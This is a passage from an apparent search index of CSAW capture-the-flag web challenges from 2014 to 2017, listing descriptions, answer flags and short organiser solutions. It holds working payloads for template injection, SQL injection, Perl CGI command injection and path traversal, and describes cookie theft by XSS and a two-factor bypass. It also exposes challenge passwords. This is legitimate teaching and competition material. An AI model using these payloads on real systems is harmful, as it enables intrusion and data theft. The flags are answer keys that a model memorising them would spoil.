            "text": "Shia Labeouf-off!\n\n\nAuthor\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nDo it\nJust do it\n\n\nDon't let your dreams be dreams\nYesterday you said tomorrow\nSo just do it\nMake your dreams come true\nJust do it\n\n\nSome people dream of success\nWhile you're gonna wake up and work hard at it\nNothing is impossible\n\n\nYou should get to the point\nWhere anyone else would quit\nAnd you're not going to stop there\nNo, what are you waiting for?\n\n\nDo it\nJust do it\nYes you can\nJust do it\nIf you're tired of starting over\nStop giving up\n\n\nPick 1:\n* \nhttp://web.chal.csaw.io:5487\n\n* \nhttp://web.chal.csaw.io:5488\n\n* \nhttp://web.chal.csaw.io:5489\n\n* \nhttp://web.chal.csaw.io:5490\n\n\nFlag\n\n\nflag{wow_much_t3mplate}\n\n\nSolution\n\n\nGo to /polls/3/ to cause a \"Our infrastructure can't support that many Shias!\" exception.\nScroll down to the \"checknum\" function call and view the source code, note the \"getme\" and \"listme\" funcs.\nGo to /ad-lib/ and type \n{% debug %}\n and notice \nmrpoopy\n\nGo back and send \n{{\n \nmrpoopy\n|\nlistme\n \n}}\n notice \n__flag__\n\nGo back and send \n{{\n \nmrpoopy\n|\ngetme\n:\n__flag__\n \n}}\n \nNote: because it is an underscore, you can't just do \n{{\n \nmrpoopy.__flag__\n \n}}\n\n\nSetup\n\n\nWebsite runs on port 8000", 
            "title": "Shia"
        }, 
        {
            "location": "/challenges/2017/web/Shia/#shia-labeouf-off", 
            "text": "", 
            "title": "Shia Labeouf-off!"
        }, 
        {
            "location": "/challenges/2017/web/Shia/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/Shia/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/Shia/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/Shia/#description", 
            "text": "Do it\nJust do it  Don't let your dreams be dreams\nYesterday you said tomorrow\nSo just do it\nMake your dreams come true\nJust do it  Some people dream of success\nWhile you're gonna wake up and work hard at it\nNothing is impossible  You should get to the point\nWhere anyone else would quit\nAnd you're not going to stop there\nNo, what are you waiting for?  Do it\nJust do it\nYes you can\nJust do it\nIf you're tired of starting over\nStop giving up  Pick 1:\n*  http://web.chal.csaw.io:5487 \n*  http://web.chal.csaw.io:5488 \n*  http://web.chal.csaw.io:5489 \n*  http://web.chal.csaw.io:5490", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/Shia/#flag", 
            "text": "flag{wow_much_t3mplate}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/Shia/#solution", 
            "text": "Go to /polls/3/ to cause a \"Our infrastructure can't support that many Shias!\" exception.\nScroll down to the \"checknum\" function call and view the source code, note the \"getme\" and \"listme\" funcs.\nGo to /ad-lib/ and type  {% debug %}  and notice  mrpoopy \nGo back and send  {{   mrpoopy | listme   }}  notice  __flag__ \nGo back and send  {{   mrpoopy | getme : __flag__   }}  \nNote: because it is an underscore, you can't just do  {{   mrpoopy.__flag__   }}", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/web/Shia/#setup", 
            "text": "Website runs on port 8000", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/", 
            "text": "Gopherz2NotSoBasic\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nSolve Gophers1, and it will tell you what to do.\n\n\nFlag\n\n\nflag{wr!t!ngAServ3rw@sn!ts0BaaaaaaadRigh?t}\n\n\nSolution\n\n\nsolver.py\n\n\nSetup\n\n\nconfig goes into .env\nrun ./setup\napp.js is given to them\nhostname has to be web.chal.csaw.io\nInternal PORT = 4333\nhost on port 4333", 
            "title": "Gopherz2NotSoBasic"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/#gopherz2notsobasic", 
            "text": "", 
            "title": "Gopherz2NotSoBasic"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/#description", 
            "text": "Solve Gophers1, and it will tell you what to do.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/#flag", 
            "text": "flag{wr!t!ngAServ3rw@sn!ts0BaaaaaaadRigh?t}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/web/Gopherz2NotSoBasic/#setup", 
            "text": "config goes into .env\nrun ./setup\napp.js is given to them\nhostname has to be web.chal.csaw.io\nInternal PORT = 4333\nhost on port 4333", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/web/littlequery/", 
            "text": "LittleQuery\n\n\nAuthor\n\n\nPoints\n\n\n200 \n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nLittleQuery I've got a new website for BIG DATA analytics!\n\nhttp://littlequery.chal.csaw.io\n\n\nFlag\n\n\nflag{mayb3_1ts_t1m3_4_real_real_escape_string?}\n\n\nSolution\n\n\n\n\nView repo listed on home page\n\n\nReview source, find api/db_explore.php is unauthenticated. In addition\nit has SQLi in the db and table params in 'preview' mode.\n\n\nExploit the SQLi with something like \napi/db_explore.php?mode=preview\ndb=littlequery`.`user\\`%20--%20\ntable=user\n to leak hashed passwords.\n\n\nUse leaked password and client-side hashing bug to log in.\n\n\nExploit runtime.js through \nquery.php\n (see \nthe pwnable's description\n for more info)", 
            "title": "littlequery"
        }, 
        {
            "location": "/challenges/2017/web/littlequery/#littlequery", 
            "text": "", 
            "title": "LittleQuery"
        }, 
        {
            "location": "/challenges/2017/web/littlequery/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/littlequery/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/littlequery/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/littlequery/#description", 
            "text": "LittleQuery I've got a new website for BIG DATA analytics! http://littlequery.chal.csaw.io", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/littlequery/#flag", 
            "text": "flag{mayb3_1ts_t1m3_4_real_real_escape_string?}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/littlequery/#solution", 
            "text": "View repo listed on home page  Review source, find api/db_explore.php is unauthenticated. In addition\nit has SQLi in the db and table params in 'preview' mode.  Exploit the SQLi with something like  api/db_explore.php?mode=preview db=littlequery`.`user\\`%20--%20 table=user  to leak hashed passwords.  Use leaked password and client-side hashing bug to log in.  Exploit runtime.js through  query.php  (see  the pwnable's description  for more info)", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/", 
            "text": "Sugar Cereal\n\n\nAuthor\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nWeb\n\n\nDescription:\n\n\n\"Idk if you have heard, but deserializing user controlled data is not a thing\nyou should be doing.\nUPDATE: Stage 2 is now listening on the correct port.\nUPDATE 2: Fix for stage 2 rolled out so you shouldn't get 500's anymore. \ncrosses fingers\n\nUPDATE 3: PHP source has changed. To resolve performance issues, output from the \npassthru\n call is not sent to the page anymore.\nUPDATE 4: Python source has changed. \n\nhttp://web.chal.csaw.io:1346/\n\"\n\n\nFlag\n\n\nSolution\n\n\nNotes\n\n\nJosh removed this challenge entirely halfway through the competition because it was so borken", 
            "title": "Sugar Cereal"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/#sugar-cereal", 
            "text": "", 
            "title": "Sugar Cereal"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/#description", 
            "text": "\"Idk if you have heard, but deserializing user controlled data is not a thing\nyou should be doing.\nUPDATE: Stage 2 is now listening on the correct port.\nUPDATE 2: Fix for stage 2 rolled out so you shouldn't get 500's anymore.  crosses fingers \nUPDATE 3: PHP source has changed. To resolve performance issues, output from the  passthru  call is not sent to the page anymore.\nUPDATE 4: Python source has changed.  http://web.chal.csaw.io:1346/ \"", 
            "title": "Description:"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/SugarCereal/#notes", 
            "text": "Josh removed this challenge entirely halfway through the competition because it was so borken", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2016/web/I_Got_id/", 
            "text": "I Got Id\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nWtf... I literally just setup this website and it's already popped...\n\n\nFlag\n\n\nFLAG{p3rl_6_iz_EVEN_BETTER!!1}\n\n\nSolution\n\n\necho \nasdf\n | curl -F \nfile=ARGV\n -F \nfile=@-\n \nhttp://localhost:8081/cgi-bin/file.pl?cat%20%2fflag%20|", 
            "title": "I Got ID"
        }, 
        {
            "location": "/challenges/2016/web/I_Got_id/#i-got-id", 
            "text": "", 
            "title": "I Got Id"
        }, 
        {
            "location": "/challenges/2016/web/I_Got_id/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/I_Got_id/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/I_Got_id/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/I_Got_id/#description", 
            "text": "Wtf... I literally just setup this website and it's already popped...", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/I_Got_id/#flag", 
            "text": "FLAG{p3rl_6_iz_EVEN_BETTER!!1}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/I_Got_id/#solution", 
            "text": "echo  asdf  | curl -F  file=ARGV  -F  file=@-   http://localhost:8081/cgi-bin/file.pl?cat%20%2fflag%20|", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/", 
            "text": "Something Something ClouDB\n\n\nAuthor\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\n\"I'm working on this new service which allows you to store notes, TODOs, and more! And all of our data is accessible over JSONP so you can integrate it into other sites!\nNOTE: The flag is NOT the mysql password.\nUPDATE: Fixed an unintentional bug which made the challenge more confusing.\n\nhttp://web.chal.csaw.io:1344\n\"\n\n\nFlag\n\n\nflag\n{\nd0nt_Forg3t_2_San1t1ze_Y0uR_C\n@11\nback\n$\n}\n\n\nSolution\n\n\n\n\nIdentify template.php as possible file read and use it to leak source\n\n\nSee in source references to db.sql.bak which is a DB backup\n\n\nSee admin ID=0\n\n\nRealize that session ID=0 can be spoofed for inserts/updates by not being logged in (b/c of interval.\n\n\nUse this to add a new tile to the admin which uses a JSONP endpoint with XSS in the callback to get cookies\n\n\nLogin with cookies. flag is in a TODO\n\n\n\n\nNotes\n\n\n\n\nRun with \ndocker\n \nrun\n \n-\ne\n \nMYSQL_PASS\n=\nS0meR3\n@11\nyG00dPa\n$$\nw0rdThatY0u5hou1dntCar3\n@\nb0uT\n \n-\np\n \n{\nWhateverPortItShouldBe\n}\n:\n80\n \ncloudb\n\nAlso needs a phantomjs thing which logs in with \nadmin\n:\nPg8ARJOVj4XUm2nIW67d\n so that they can steal admin cookies.", 
            "title": "Cloudb"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/#something-something-cloudb", 
            "text": "", 
            "title": "Something Something ClouDB"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/#description", 
            "text": "\"I'm working on this new service which allows you to store notes, TODOs, and more! And all of our data is accessible over JSONP so you can integrate it into other sites!\nNOTE: The flag is NOT the mysql password.\nUPDATE: Fixed an unintentional bug which made the challenge more confusing. http://web.chal.csaw.io:1344 \"", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/#flag", 
            "text": "flag { d0nt_Forg3t_2_San1t1ze_Y0uR_C @11 back $ }", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/#solution", 
            "text": "Identify template.php as possible file read and use it to leak source  See in source references to db.sql.bak which is a DB backup  See admin ID=0  Realize that session ID=0 can be spoofed for inserts/updates by not being logged in (b/c of interval.  Use this to add a new tile to the admin which uses a JSONP endpoint with XSS in the callback to get cookies  Login with cookies. flag is in a TODO", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/web/cloudb/#notes", 
            "text": "Run with  docker   run   - e   MYSQL_PASS = S0meR3 @11 yG00dPa $$ w0rdThatY0u5hou1dntCar3 @ b0uT   - p   { WhateverPortItShouldBe } : 80   cloudb \nAlso needs a phantomjs thing which logs in with  admin : Pg8ARJOVj4XUm2nIW67d  so that they can steal admin cookies.", 
            "title": "Notes"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/", 
            "text": "Lawn Care Simulator\n\n\nAuthor\n\n\nBeastes\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nFlag\n\n\n667e217666098fd0d8055c04c71bebc7\n\n\nSolution\n\n\nsolve.py\n\n\nSetup", 
            "title": "Lawn Care Simulator"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/#lawn-care-simulator", 
            "text": "", 
            "title": "Lawn Care Simulator"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/#author", 
            "text": "Beastes", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/#flag", 
            "text": "667e217666098fd0d8055c04c71bebc7", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/web/lawn-care-simulator/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/", 
            "text": "QuizApp\n\n\nAuthor\n\n\nOberheide\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nhttps://csaw-2014.appspot.com/\n\n\nFlag\n\n\n96ef46cacf3f832f0e43f7f9e265a3ac3ca0ca2b\n\n\nSolution\n\n\nSo, it's a web app that just gives you a user/pass login prompt.\n\n\nIf you poke around at \nrobots.txt\n or \nsitemap.xml\n, you'll notice a /backup URI:\n\n\n?xml version=\n1.0\n encoding=\nUTF-8\n?\n\n\nurlset\n \nxmlns=\nhttp://www.sitemaps.org/schemas/sitemap/0.9\n\n  \nurl\n\n    \nloc\nhttps://csaw-2014.appspot.com/\n/loc\n\n    \nlastmod\n2014-01-01\n/lastmod\n\n    \nchangefreq\nmonthly\n/changefreq\n\n    \npriority\n0.5\n/priority\n\n  \n/url\n\n  \nurl\n\n    \nloc\nhttps://csaw-2014.appspot.com/auth1\n/loc\n\n    \nlastmod\n2014-01-01\n/lastmod\n\n    \nchangefreq\nmonthly\n/changefreq\n\n    \npriority\n0.5\n/priority\n\n  \n/url\n\n  \nurl\n\n    \nloc\nhttps://csaw-2014.appspot.com/backup\n/loc\n\n    \nlastmod\n2014-01-01\n/lastmod\n\n    \nchangefreq\nmonthly\n/changefreq\n\n    \npriority\n0.5\n/priority\n\n  \n/url\n\n\n/urlset\n\n\n\n\n\n\nThe /backup URI will dump you a zlib-compressed text of a mysql session:\n\n\ncsaw2014 ~ # mysql -u root -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 1021899\nServer version: 5.5.32-log Source distribution\n\nCopyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType \nhelp;\n or \n\\h\n for help. Type \n\\c\n to clear the current input statement.\n\nmysql\n use csaw2014;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql\n show tables;\n+-----------------------+\n| Tables_in_csaw2014    |\n+-----------------------+\n| csaw_auth             |\n| csaw_data             |\n| csaw_flag             |\n+-----------------------+\n3 rows in set (0.00 sec)\n\nmysql\n select * from csaw_auth;\n+----+---------------+---------------------+--------------------------+-------------------+\n| ID | auth_username | auth_password_crypt | auth_securid_seed        | auth_email        |\n+----+---------------+---------------------+--------------------------+-------------------+\n|  1 | jono          | ..0WZygs1WB7.       | dxeTnBVT1aEQWaUlk9zYBg== | jon@oberheide.org |\n+----+---------------+---------------------+--------------------------+-------------------+\n1 row in set (0.00 sec)\n\n\n\n\n\nNote: this is actually fake mysql output, there's no database involved in the challenge. But hopefully people will see the csaw_flag table and get fooled into trying some SQLi. ;-)\n\n\nSo, you can crack that DES-crypted password pretty easily. Once you've done that, you can use that in the original web app login. Then you'll get a two-factor challenge.\n\n\nThe auth_securid_seed value in the DB dump is for a RSA SecurID token so you need to find out how to generate a valid passcode from that seed. Once you've done that, you're past the two-factor auth in the web app.\n\n\nNext, there's a quick quiz Q\nA with the following questions:\n- what's the longest running hacker con in murica?\n- what is one of the l0pht group's lesser-known mottos?\n- what tv-personality-turned-hacker wrote an article on bypassing windows dep?\n- what twitter account run by dino dai zovi is known for providing solid security advice?\n- what's the square root of this apartment?\n\n\nAfter you answer those, you get the flag!\n\n\nSetup", 
            "title": "App"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/#quizapp", 
            "text": "", 
            "title": "QuizApp"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/#author", 
            "text": "Oberheide", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/#description", 
            "text": "https://csaw-2014.appspot.com/", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/#flag", 
            "text": "96ef46cacf3f832f0e43f7f9e265a3ac3ca0ca2b", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/#solution", 
            "text": "So, it's a web app that just gives you a user/pass login prompt.  If you poke around at  robots.txt  or  sitemap.xml , you'll notice a /backup URI:  ?xml version= 1.0  encoding= UTF-8 ?  urlset   xmlns= http://www.sitemaps.org/schemas/sitemap/0.9 \n   url \n     loc https://csaw-2014.appspot.com/ /loc \n     lastmod 2014-01-01 /lastmod \n     changefreq monthly /changefreq \n     priority 0.5 /priority \n   /url \n   url \n     loc https://csaw-2014.appspot.com/auth1 /loc \n     lastmod 2014-01-01 /lastmod \n     changefreq monthly /changefreq \n     priority 0.5 /priority \n   /url \n   url \n     loc https://csaw-2014.appspot.com/backup /loc \n     lastmod 2014-01-01 /lastmod \n     changefreq monthly /changefreq \n     priority 0.5 /priority \n   /url  /urlset   The /backup URI will dump you a zlib-compressed text of a mysql session:  csaw2014 ~ # mysql -u root -p\nEnter password:\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 1021899\nServer version: 5.5.32-log Source distribution\n\nCopyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType  help;  or  \\h  for help. Type  \\c  to clear the current input statement.\n\nmysql  use csaw2014;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nmysql  show tables;\n+-----------------------+\n| Tables_in_csaw2014    |\n+-----------------------+\n| csaw_auth             |\n| csaw_data             |\n| csaw_flag             |\n+-----------------------+\n3 rows in set (0.00 sec)\n\nmysql  select * from csaw_auth;\n+----+---------------+---------------------+--------------------------+-------------------+\n| ID | auth_username | auth_password_crypt | auth_securid_seed        | auth_email        |\n+----+---------------+---------------------+--------------------------+-------------------+\n|  1 | jono          | ..0WZygs1WB7.       | dxeTnBVT1aEQWaUlk9zYBg== | jon@oberheide.org |\n+----+---------------+---------------------+--------------------------+-------------------+\n1 row in set (0.00 sec)  Note: this is actually fake mysql output, there's no database involved in the challenge. But hopefully people will see the csaw_flag table and get fooled into trying some SQLi. ;-)  So, you can crack that DES-crypted password pretty easily. Once you've done that, you can use that in the original web app login. Then you'll get a two-factor challenge.  The auth_securid_seed value in the DB dump is for a RSA SecurID token so you need to find out how to generate a valid passcode from that seed. Once you've done that, you're past the two-factor auth in the web app.  Next, there's a quick quiz Q A with the following questions:\n- what's the longest running hacker con in murica?\n- what is one of the l0pht group's lesser-known mottos?\n- what tv-personality-turned-hacker wrote an article on bypassing windows dep?\n- what twitter account run by dino dai zovi is known for providing solid security advice?\n- what's the square root of this apartment?  After you answer those, you get the flag!", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/web/app_-_Oberheide/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/", 
            "text": "CSAW OAUTH2\n\n\nAuthor\n\n\nitszn, Ret2 Systems\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nWe found this weird site that lets you send short messages of a much better length than 140 280 characters.\n\nhttp://broadcastr.chal.csaw.io:4000\n\nNOTE: The 500 on the /user/history endpoint is irrelevant.\n\n\nFlag\n\n\nflag{m4yb3_w3_n33d_oauth3_n3xt?}\n\n\nSolution\n\n\nsol.py\n\n\nSetup\n\n\n\n\nInstall docker\n\n\nModify \nconfig.sh\n to have the correct urls and settings\n\n\n./create.sh\n to build the docker container\n\n\n./run.sh\n to run the container", 
            "title": "Broadcastr"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/#csaw-oauth2", 
            "text": "", 
            "title": "CSAW OAUTH2"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/#author", 
            "text": "itszn, Ret2 Systems", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/#description", 
            "text": "We found this weird site that lets you send short messages of a much better length than 140 280 characters. http://broadcastr.chal.csaw.io:4000 \nNOTE: The 500 on the /user/history endpoint is irrelevant.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/#flag", 
            "text": "flag{m4yb3_w3_n33d_oauth3_n3xt?}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/#solution", 
            "text": "sol.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/web/csaw-oauth2-chal/#setup", 
            "text": "Install docker  Modify  config.sh  to have the correct urls and settings  ./create.sh  to build the docker container  ./run.sh  to run the container", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/", 
            "text": "KWS (Part 1)\n\n\nAuthor\n\n\nitszn, Ret2 Systems\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nWe developed a much better alternative to AWS. Our high-performance kernel driver gives us unparalleled speed of execution. And we're super-secure!\n\nhttp://web.chal.csaw.io:6001/\n\n\nNOTE: Login with your CTFd credentials.\nNOTE: This might take a minute to start up the first time you login. Please be patient!\nNOTE: There may be ways to poke at other teams' boxes. Don't do that, it is not part of the challenge.\nNOTE: If you have issues with your instance, try logging out of the KWS interface, and logging back in.\nNOTE: Sorry for all of the notes :P\n\n\nFlag\n\n\nflag{why_d03s_th1s_k3rnel_sm3ll_l1ke_p1ckl3s}\n\n\nSolution\n\n\nin \n./solutions\n\n\nPremise\n\n\nCloud Object Storage With Kernel Accleration\n\n\nThis is a two part challenge. The first part is a ~300 point web challenge. The second is a 500 point kernel pwning challenge.\n\n\nEach team should get their own instance running the KWS back end. There is a main server that acts as the\nface of the web challenge, and will allow players to reboot/reset their instance (if they fuck up the kernel part)\n\n\nInstance control is still not implmented yet\n\n\nThe goal of the first part is to exploit the usage of pickle on signed objects in the backend server to get a shell on the instance.\n\n\nThe instance is running a custom kernel module (source in \n./instance/kernel/hash.c\n) which implements a hashmap\nthat can read and store objects json from a python userspace process.\n\n\nThis module can be exploited to EOP to root. The last flag is in /flag", 
            "title": "KWS 1"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/#kws-part-1", 
            "text": "", 
            "title": "KWS (Part 1)"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/#author", 
            "text": "itszn, Ret2 Systems", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/#description", 
            "text": "We developed a much better alternative to AWS. Our high-performance kernel driver gives us unparalleled speed of execution. And we're super-secure! http://web.chal.csaw.io:6001/  NOTE: Login with your CTFd credentials.\nNOTE: This might take a minute to start up the first time you login. Please be patient!\nNOTE: There may be ways to poke at other teams' boxes. Don't do that, it is not part of the challenge.\nNOTE: If you have issues with your instance, try logging out of the KWS interface, and logging back in.\nNOTE: Sorry for all of the notes :P", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/#flag", 
            "text": "flag{why_d03s_th1s_k3rnel_sm3ll_l1ke_p1ckl3s}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/#solution", 
            "text": "in  ./solutions", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/web/csaw-kernel-challenge/#premise", 
            "text": "Cloud Object Storage With Kernel Accleration  This is a two part challenge. The first part is a ~300 point web challenge. The second is a 500 point kernel pwning challenge.  Each team should get their own instance running the KWS back end. There is a main server that acts as the\nface of the web challenge, and will allow players to reboot/reset their instance (if they fuck up the kernel part)  Instance control is still not implmented yet  The goal of the first part is to exploit the usage of pickle on signed objects in the backend server to get a shell on the instance.  The instance is running a custom kernel module (source in  ./instance/kernel/hash.c ) which implements a hashmap\nthat can read and store objects json from a python userspace process.  This module can be exploited to EOP to root. The last flag is in /flag", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2017/web/orangev2/", 
            "text": "orange v2\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nWeb\n\n\nDescription\n\n\nI wrote a little proxy program in NodeJS for my poems folder but I'm bad at programming so I had to rewrite it. Again. I changed up flag.txt too but everyone still wants to read it... \nhttp://web.chal.csaw.io:7312/?path=orange.txt\n \n\n\nI wrote a little proxy program in NodeJS for my poems folder but I'm bad at programming so I had to rewrite it.\n\n\nI changed up flag.txt too but everyone still wants to read it...\n\n\nFlag\n\n\nflag{s0rry_this_t00k_s0_m@ny_tries...}\n\n\nSolution\n\n\nhttp://web.chal.csaw.io:7312/?path=\u012e\u012e/flag.txt", 
            "title": "OrangeV2"
        }, 
        {
            "location": "/challenges/2017/web/orangev2/#orange-v2", 
            "text": "", 
            "title": "orange v2"
        }, 
        {
            "location": "/challenges/2017/web/orangev2/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/web/orangev2/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/web/orangev2/#category", 
            "text": "Web", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/web/orangev2/#description", 
            "text": "I wrote a little proxy program in NodeJS for my poems folder but I'm bad at programming so I had to rewrite it. Again. I changed up flag.txt too but everyone still wants to read it...  http://web.chal.csaw.io:7312/?path=orange.txt    I wrote a little proxy program in NodeJS for my poems folder but I'm bad at programming so I had to rewrite it.  I changed up flag.txt too but everyone still wants to read it...", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/web/orangev2/#flag", 
            "text": "flag{s0rry_this_t00k_s0_m@ny_tries...}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/web/orangev2/#solution", 
            "text": "http://web.chal.csaw.io:7312/?path=\u012e\u012e/flag.txt", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/web/notmycupofcoffe/", 
